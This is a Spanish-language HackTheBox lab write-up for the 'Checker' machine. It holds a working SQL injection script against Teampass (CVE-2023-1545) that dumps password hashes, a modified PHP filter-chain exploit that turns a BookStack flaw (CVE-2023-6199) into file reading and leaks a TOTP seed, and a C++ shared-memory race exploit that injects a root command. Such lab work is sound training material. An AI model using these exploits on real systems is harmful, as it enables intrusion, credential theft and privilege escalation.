@@ -1,0 +1,458 @@
+---
+title: "Máquina Checker"
+description: "Resolución de la máquina Checker de HackTheBox"
+tags: ["CVE-2023-1545", "CVE-2023-6199", "PHP Filters", "2FA", "Reverse Engineering", "Race Condition"]
+categories: ["HackTheBox", "Hard", "Linux"]
+logo: "/assets/writeups/checker/logo.webp"
+---
+
+Un servidor web con una instancia de Bookstack y Teampass contiene dichos software desactualizados, por lo que abuseremos de dos CVEs para obtener credenciales y así acceso SSH al servidor. Escalaremos privilegios abusando de un binario que podremos ejecutar con `sudo`.
+
+## Reconocimiento
+
+La máquina tiene 3 puertos abiertos.
+
+```bash
+# Nmap 7.95 scan initiated Sat Feb 22 15:00:23 2025 as: nmap -sS -Pn -p- --open -oN ports --min-rate 300 -vvv 10.129.247.121
+Nmap scan report for 10.129.247.121
+Host is up, received user-set (0.15s latency).
+Scanned at 2025-02-22 15:00:23 -04 for 51s
+Not shown: 65014 closed tcp ports (reset), 518 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+80/tcp   open  http       syn-ack ttl 63
+8080/tcp open  http-proxy syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Feb 22 15:01:14 2025 -- 1 IP address (1 host up) scanned in 51.86 seconds
+```
+
+El sitio web en el puerto 80, `checker.htb`, se trata de una instancia de Bookstack:
+
+![Bookstack](/assets/writeups/checker/1.png)
+
+Mientras que el del 8080 se trata de una instancia de Teampass:
+
+![Teampass](/assets/writeups/checker/2.png)
+
+No tenemos credenciales para acceder a ninguno de los dos sitios, por lo que veremos que logramos por estas dos cosas.
+
+## Intrusión
+
+### Credenciales de Teampass
+
+Si indagamos por el código fuente de Teampass, veremos unos cuantos archivos interesantes como un `changelog.txt`. Como muchas veces varios administradores de sitios siempre, o clonan el repositorio directamente o se descargan el comprimido con el sitio dejando ciertos archivos expuestos como el mencionado, podemos probar a ver si el sitio lo tiene. Y haciéndolo podemos ver que:
+
+```bash
+❯ curl -s http://checker.htb:8080/changelog.txt
+/*
+ * Teampass - a collaborative passwords manager.
+ * ---
+ * This library is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * ---
+ * @project   Teampass
+ * @version   
+ * @file      changelog.txt
+ * ---
+ * @author    Nils Laumaillé (nils@teampass.net)
+ * @copyright 2009-2022 Teampass.net
+ * @license   https://spdx.org/licenses/GPL-3.0-only.html#licenseText GPL-3.0
+ * ---
+ * @see       https://www.teampass.net
+ */
+... [snip]
+```
+
+El copyright es del 2022, y viendo que el actual marca 2025 ya podemos ver que la versión de esto está *muy* desactualizada. Buscando por vulnerabilidades, encontraremos a `CVE-2023-1545`, que se trata de una [inyección SQL en el endpoint de autenticación /authorize](https://huntr.com/bounties/942c015f-7486-49b1-94ae-b1538d812bc2). En el bounty del bug tenemos un PoC que extrae nombres de usuarios y hashes incluso:
+
+```bash
+if [ "$#" -lt 1 ]; then
+  echo "Usage: $0 <base-url>"
+  exit 1
+fi
+
+vulnerable_url="$1/api/index.php/authorize"
+
+check=$(curl --silent "$vulnerable_url")
+if echo "$check" | grep -q "API usage is not allowed"; then
+  echo "API feature is not enabled :-("
+  exit 1
+fi
+
+# htpasswd -bnBC 10 "" h4ck3d | tr -d ':\n'
+arbitrary_hash='$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'
+
+exec_sql() {
+  inject="none' UNION SELECT id, '$arbitrary_hash', ($1), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin"
+  data="{\"login\":\""$inject\"",\"password\":\"h4ck3d\", \"apikey\": \"foo\"}"
+  token=$(curl --silent --header "Content-Type: application/json" -X POST --data "$data" "$vulnerable_url" | jq -r '.token')
+  echo $(echo $token| cut -d"." -f2 | base64 -d 2>/dev/null | jq -r '.public_key')
+}
+
+users=$(exec_sql "SELECT COUNT(*) FROM teampass_users WHERE pw != ''")
+
+echo "There are $users users in the system:"
+
+for i in `seq 0 $(($users-1))`; do
+  username=$(exec_sql "SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
+  password=$(exec_sql "SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
+  echo "$username: $password"
+done
+```
+
+Probándolo contra la web que tenemos, veremos que:
+
+```bash
+❯ ./dump.sh http://checker.htb:8080/
+There are 2 users in the system:
+admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
+bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
+```
+
+La contraseña del usuario administrador es robusta, pero la de bob no:
+
+```bash
+❯ hashcat -m 3200 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --show
+$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy:cheerleader
+```
+
+Con esto podremos acceder a la interfaz de la aplicación, y veremos unas credenciales almacenadas que son para el Bookstack, ¡y para SSH!:
+
+![Credentials](/assets/writeups/checker/3.png)
+
+Pero... el SSH tiene 2FA:
+
+```bash
+❯ /usr/bin/ssh reader@checker.htb
+(reader@checker.htb) Password: -> hiccup-publicly-genesis
+(reader@checker.htb) Verification code: -> ...
+```
+
+No podremos hacer nada por acá, por ahora. Asi que vámonos al Bookstack.
+
+### reader - checker
+
+Al acceder a Bookstack con las credenciales de bob, veremos unos cuantos libros o posts escritos por él:
+
+![Some books](/assets/writeups/checker/4.png)
+
+Parecen ser algunas notas para temas de administración de Linux. Del resto no tenemos algo más interesante.
+
+No podemos ver la versión de BookStack tal como lo hicimos con Teampass, por lo que nos tocará buscar por vulnerabilidades y probar... en eso encontramos a [CVE-2023-6199](https://fluidattacks.com/advisories/imagination), que se trata de un SSRF que puede ser pasado a LFI en los endpoints para guardar borradores de futuros libros. Pero en el vídeo solo nos muestran un SSRF... ¿cómo podemos convertirlo en un LFI?
+
+En el código del commit que hicieron para solucionar el bug, encontraremos que estaban utilizando `Intervention\Image\ImageManager#make` para cargar los datos de la imagen:
+
+![Code](/assets/writeups/checker/5.png)
+
+Intervention es una libreria para cuestiones de procesamiento de imágenes. Si buscamos información por dicho método y la propia libreria en el tema de seguridad, nos encontraremos con un [peculiar post](https://www.assetnote.io/resources/research/leaking-file-contents-with-a-blind-file-oracle-in-flarum?ref=assetnote.io&ref=assetnote.io) que nos habla de una vulnerabilidad en un software llamado Flarum que ocurre exactamente por lo mismo que vimos en BookStack, y nos indica como podemos llegar a filtrar contenido de archivos de la máquina abusando la propia mecánica de los filtros de PHP.
+
+Podemos encontrar un [PoC escrito en Python](https://github.com/synacktiv/php_filter_chains_oracle_exploit) por parte de Synacktiv que nos permitirá abusar de esto mismo de forma (casi) automática:
+
+```bash
+❯ python filters_chain_oracle_exploit.py 
+usage: filters_chain_oracle_exploit.py [-h] --target TARGET --file FILE --parameter PARAMETER [--data DATA] [--headers HEADERS] [--verb VERB]
+                                       [--proxy PROXY] [--in_chain IN_CHAIN] [--time_based_attack TIME_BASED_ATTACK] [--delay DELAY] [--json JSON]
+                                       [--match MATCH] [--offset OFFSET] [--log LOG]
+filters_chain_oracle_exploit.py: error: the following arguments are required: --target, --file, --parameter
+```
+
+Pero claro... necesitaremos modificar algo, recordemos que solo nos leerá la URL si enviamos los datos en formato base64 en una URI `data:image/png;base64,<data>`, por lo que tendremos que adaptar el programa a eso.
+
+Tendremos que editar el archivo `core/requestor.py` para indicarle que nos ponga la cadena resultante en el formato que mencionamos arriba, especifcamente tendremos que editar el método `req_with_response` agregándole esto:
+
+```python
+... [snip]
+filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
+
+encoded_chain = base64.b64encode(bytes(filter_chain, 'utf-8'))
+new_chain = f"<img src='data:image/png;base64,{encoded_chain.decode()}'>"
+ 
+# DEBUG print(filter_chain)
+merged_data = self.parse_parameter(new_chain)
+... [snip]
+```
+
+Ahora, podemos probar esto contra el sitio y veremos que funciona sin problemas (diciendonos al mismo tiempo, que el sitio efectivamente es vulnerable), mostrándonos una porción del archivo `/etc/hosts`:
+
+```bash
+❯ python filters_chain_oracle_exploit.py --target http://checker.htb/ajax/page/10/save-draft --json=1 --data '{"name":"New Pageasdasd"}' --verb PUT --parameter html --headers '{"Cookie":"XSRF-TOKEN=eyJpdiI6IkJ4UHhpV2lWaXZVMHkzWGhkOHdGbnc9PSIsInZhbHVlIjoiWnpqb1dud0hZN3Q4VkFzRGk0MHJPSnMxTEF6eEtHT1NJTGZRb093YXdENDlKUmU0M0trbnF0NlhFc1JESEpSQ2hYY0NNaDRHUEYvcC8wUGJQbzFUb0xVaTlyMjAxNGViZ1QwbTFab3FuME56anc1c2dMUm5ORmdKOExSZTdTeE4iLCJtYWMiOiJhZmYyNjg1ZGExMzg2NTE4M2I2NTAyOGNkMTMyNmQyZDI0NmM2MDIyNjk0NTM1YTIyY2M2YWZjODdhYmM0ZjlkIiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6IkVUaVZza25DbGZmdXMyWG9WcHEvdnc9PSIsInZhbHVlIjoieUF1T1lUWVN1bmd5YTU3cGRNQldqb0RlZU14bzhIVnM3alJVcjlxRHZSdE5UNTBHSFg0M3I5YnprdnIzRWVUTlh5MlJXaG1jRGdQOTg3ZnYyRy9GS0pMZzRDbWp4d0RWdktFdUR2ZjVxR2Z3YjBkQjdCdjBnTldBYytuZXJGSmMiLCJtYWMiOiIyMjJmMTkyMGZiYzNmYTVkZmU1ZWQxODUzZTk4YWJjMjcxMGY2ZTZiYTU0NTNhYTRjODY1N2Y2ZTViZDRiYjhmIiwidGFnIjoiIn0%3D;","X-CSRF-TOKEN":"hphGIzZw8Lwmg7LRSRqtYeN6jg8XRWkir1iuR106"}' --file /etc/hosts
+[*] The following URL is targeted : http://checker.htb/ajax/page/10/save-draft
+[*] The following local file is leaked : /etc/hosts
+[*] Running PUT requests
+[*] Additionnal data used : {"name":"New Pageasdasd"}
+... [snip]
+  [*] File leak gracefully stopped.
+[+] File /etc/hosts was partially leaked
+MTI3LjAuMC4xIGxvY2FsaG9zd
+b'127.0.0.1 localhost'
+```
+
+Nos seria muy conveniente filtrar algo útil y corto... como puede ser el archivo donde se guarda la semilla OTP del mecanismo 2FA de SSH.
+
+Si vemos el contenido de los posts que vimos al principio cuando apenas entramos al sitio, veremos que en el post titulado `Basic Backup with cp` hay algo muy curioso:
+
+![Uh Oh, so](/assets/writeups/checker/6.png)
+
+¿Será que el creador estará usando este mismo script para hacer sus copias de seguridad? Si es así, podriamos intentar ver su directorio personal, y hablando de la semilla OTP, si se está utilizando Google authenticator (que es el más usado para OpenSSH) la misma estará dentro del archivo `/home/<username>/.google_authenticator`. Si con el script que acabamos de modificar probamos a ver si el archivo se encuentra en la supuesta copia de seguridad (`/backup/home_backup/home/reader/.google_authenticator`) veremos que:
+
+```bash
+[*] The following URL is targeted : http://checker.htb/ajax/page/10/save-draft
+[*] The following local file is leaked : /backup/home_backup/home/reader/.google_authenticator
+[*] Running PUT requests
+[*] Additionnal data used : {"name":"New Pageasdasd"}
+... [snip]
+[+] File /backup/home_backup/home/reader/.google_authenticator leak is finished!
+RFZEQlJBT0RMQ1dGN0kyT05BNEs1TFFMVUUKIiBUT1RQX0FVVEgK
+b'DVDBRAODLCWF7I2ONA4K5LQLUE\n" TOTP_AUTH\n'
+```
+
+¡Estamos de suerte!
+
+Con la librería de Python `pyotp` podremos obtener el código correspondiente:
+
+```python
+>>> import pyotp
+>>> uwu = pyotp.TOTP("DVDBRAODLCWF7I2ONA4K5LQLUE")
+>>> uwu.now()
+'778754'
+```
+
+y funciona:
+
+```bash
+❯ /usr/bin/ssh reader@checker.htb
+(reader@checker.htb) Password: -> hiccup-publicly-genesis
+(reader@checker.htb) Verification code: -> 778754
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Last login: Fri Jun 6 01:15:27 2025 from 10.10.16.48
+reader@checker:~$ 
+```
+
+En la carpeta personal de este usuario encontraremos la primera flag.
+
+```bash
+reader@checker:~$ ls -al
+total 36
+drwxr-x--- 4 reader reader 4096 Feb  6 04:22 .
+drwxr-xr-x 3 root   root   4096 Jun 12  2024 ..
+lrwxrwxrwx 1 root   root      9 Feb  6 04:07 .bash_history -> /dev/null
+-rw-r--r-- 1 reader reader  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 reader reader 3771 Jan  6  2022 .bashrc
+drwx------ 2 reader reader 4096 Jun 15  2024 .cache
+-r-------- 1 reader reader   39 Jun 14  2024 .google_authenticator
+drwxrwxr-x 3 reader reader 4096 Jun 15  2024 .local
+-rw-r--r-- 1 reader reader  807 Jan  6  2022 .profile
+-rw-r----- 1 root   reader   33 Jun  5 10:08 user.txt
+reader@checker:~$ cat user.txt
+6652cf850f83c1d1b6f5d9c446******
+```
+
+## Escalada de privilegios
+
+Tenemos un permiso para ejecutar un script como quien sea:
+
+```bash
+reader@checker:~$ sudo -l
+Matching Defaults entries for reader on checker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User reader may run the following commands on checker:
+    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
+```
+
+El script hace lo siguiente: 
+
+```bash
+#!/bin/bash
+source `dirname $0`/.env
+USER_NAME=$(/usr/bin/echo "$1" | /usr/bin/tr -dc '[:alnum:]')
+/opt/hash-checker/check_leak "$USER_NAME"
+```
+{: file="/opt/hash-checker/check-leak.sh" }
+
+`/opt/hash-checker/check_leak` es un binario programado en C al parecer, por lo que vamos a tener que hacer ingenería inversa para saber que hace por detrás. Pero por lo que vemos del script y el nombre, se puede pensar que esto es para verificar si hay credenciales filtradas en la base de datos.
+
+En las primeras líneas de pseudocódigo que nos da Ghidra, podemos ver que se conecta a la base de datos (debo recalcar que he simplificado bastante el código que Ghidra da, para temas de entendimiento):
+
+```c
+// Main function
+  ... [snip]
+char* db_host = getenv("DB_HOST");
+char* db_user = getenv("DB_USER");
+char* db_password = getenv("DB_PASSWORD");
+char* db_name = getenv("DB_NAME");
+
+if(db_host == 0 || db_user == 0 || db_password == 0 || db_name == 0){
+    printf("Error: Missing database credentials in environment\n");
+    return 1;
+}
+... [snip]
+```
+
+Después de verificar si hay un parámetro y que este tenga menos de 20 carácteres, procederá a utilizar la libreria de MySQL para obtener el hash de la contraseña del usuario que le hemos pasado como único parámetro:
+
+```c
+// Main function
+... [snip]
+if(argc < 2){
+    fprintf("Usage: %s <USER>\n", argv[0]);
+    return 1;
+}
+
+char* username = argv[1];
+
+if(strlen(username) > 20){
+   printf("Error: <USER> is too long. Maximum length is 20 characters.\n");
+   return 1;
+}
+
+char* hash_ptr = fetch_hash_from_db(db_host, db_user, db_password, db_name, username)
+... [snip]
+```
+
+Como he dicho, la función `fetch_hash_from_db` ejecuta una consulta SQL utilizando la propia librería de C de MySQL, por lo que acá no podremos hacer mucho por ahora. Pero si seguimos leyendo veremos que si detecta un hash filtrado, el programa irá a `notify_user` y al mismo tiempo guardará en la memoria compartida (shm) el hash filtrado con este formato:
+
+```bash
+Leaked hash detected at (time) > (hash)
+```
+
+El ID de la memoria compartida será `rand() % 0xFFFF` con un tamaño de 1024 y con flags `950` (Equivalente a IPC_CREAT\|0666).`0666` identifica los bits de permiso en octal, lo que nos da a entender que podemos cambiar el registro de memoria temporal que será creado por el programa si logramos obtener el ID, y como el programa asigna un ID aleatorio en base a `time()` significa que dependiendo de lo que haga el programa con esto, podriamos tener una vulnerabilidad de condición de carrera.
+
+Bueno, luego de hacer eso el programa pasará el control a la función `notify_user` que hace algo muy interesante:
+
+```c
+// notify_user function
+... [snip]
+char* haystack = shmat(__shmid, 0, 0);
+... [snip]
+char* ptr1 = strstr(haystack, "Leaked hash detected");
+if(ptr1 == 0){
+    puts("No hash detected in memory");
+} else {
+    char* diamond_ptr = strchr(haystack, ">");
+    if(diamond_ptr == 0){
+        puts("Malformed data in the shared memory");
+    } else {
+        char* hash = trim_bcrypt_hash(diamond_ptr);
+        char* cmd_buff = (char*) malloc(command_size);
+
+        if (cmd_buff == 0){
+            puts("Failed to allocate memory for command");
+            shmdt(haystack);
+        } else {
+            snprintf(cmd_buff, "mysql -u %s -D %s -s -N -e \'select email from teampass_users where pw = \"%s\" \'", db_user, db_name, hash);
+            
+            __stream = popen(cmd_buff, "r");
+        }
+    }
+}
+```
+
+Está ejecutando un comando con lo que consiga en la memoria compartida que asignó antes sin ninguna validación del hash, ya que `trim_bcrypt_hash` solamente toma los carácteres que siguen después del texto identificativo. Es de notar que al final de la función, el espacio de memoria compartida utilizado es liberado, lo que convierte esto en efectivamente, una condición de carrera.
+
+Podemos usar el siguiente programa en C++, que simplemente se queda en bucle intentando obtener la memoria compartida, utilizando el mismo mecanismo que usa este programa para generar las IDs de los espacios de memoria compartida. En caso de que logre obtenerlo, va a sustituir el hash por un comando de nuestra elección:
+
+```cpp
+#include <cstdlib>
+#include <iostream>
+#include <ctime>
+#include <sys/shm.h>
+
+using namespace std;
+
+int main(int argc, char** argv){
+  while(1){
+    // Let's seed it
+    time_t test = {0};
+    time(&test);
+
+    srand(test);
+
+    int thing = rand() % 0xfffff; // stoi(id, 0, 16);
+    int shm_id = shmget(thing, 1024, 0);
+  
+    if(shm_id == -1){
+      continue;
+    }
+
+    char* buff = (char*) shmat(shm_id, 0, 0);
+
+    if(buff == -1){
+      perror("shmat: ");
+      continue;
+    }
+
+
+    cout << "Now injecting content..." << endl;
+    string inject = "Leaked hash detected at 1 > '; chmod u+s /bin/bash #";
+
+    sprintf(buff, inject.c_str());
+    shmdt(buff);
+
+    cout << "Done!" << endl;
+    return 0;
+  }
+}
+```
+{: file="shm_inject.cpp" }
+
+Compilaremos esto con `g++ shm_inject.cpp -fpermissive -o shm_inject` (no voy a seguir el ISO C++ en este caso) y lo ejecutaremos en una sesión SSH aparte, mientras que en otra ejecutaremos el programa `check_leak` en cuestión unas cuantas veces, hasta que:
+
+```bash
+reader@checker:/tmp$ ./shm_inject
+Now injecting content...
+Done!
+```
+
+```bash
+reader@checker:~$ sudo /opt/hash-checker/check-leak.sh bob
+Password is leaked!
+Using the shared memory 0x68AB as temp location
+ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"' at line 1
+Failed to read result from the db
+```
+
+y el comando que hemos puesto se ha ejecutado
+
+```bash
+reader@checker:~$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
+```
+
+Por lo que ya podemos proceder a tomar la última flag.
+
+```bash
+reader@checker:~$ bash -p
+bash-5.1# cd /root
+bash-5.1# ls -al
+total 36
+drwx------  6 root root 4096 Jun  6 10:05 .
+drwxr-xr-x 21 root root 4096 Feb  6 04:22 ..
+lrwxrwxrwx  1 root root    9 Feb  6 04:07 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+drwx------  5 root root 4096 Feb  6 04:22 .cache
+drwxr-xr-x  5 root root 4096 Feb  6 04:22 .config
+drwxr-xr-x  3 root root 4096 Feb  6 04:22 .local
+lrwxrwxrwx  1 root root    9 Feb  6 04:07 .mysql_history -> /dev/null
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+drwx------  2 root root 4096 Feb  6 04:22 .ssh
+-rw-r-----  1 root root   33 Jun  6 10:05 root.txt
+bash-5.1# cat root.txt
+2380beac9f2dcc377f696af002******
+```
